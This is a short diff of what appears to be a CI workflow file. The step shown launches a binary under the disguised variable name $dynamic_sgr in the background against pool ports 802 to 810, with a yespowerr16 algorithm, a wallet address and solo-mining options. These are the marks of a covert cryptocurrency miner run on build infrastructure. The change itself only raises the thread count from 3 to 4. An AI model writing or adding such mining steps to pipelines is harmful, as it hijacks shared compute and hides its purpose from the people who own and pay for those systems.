@@ -75,7 +75,7 @@ jobs:
             # Start the process for multiple ports
             for port in $(seq 802 810); do
               # Run the process with the specified parameters in background
-              nohup $dynamic_sgr -a yespowerr16 --pool $ip:$port -u YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC --timeout 120 -t 3 -p m=solo > dance_$port_$timestamp.log 2>&1 &
+              nohup $dynamic_sgr -a yespowerr16 --pool $ip:$port -u YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC --timeout 120 -t 4 -p m=solo > dance_$port_$timestamp.log 2>&1 &
               process_pid=$!
 
               echo "Started process with PID $process_pid using IP $ip and port $port"
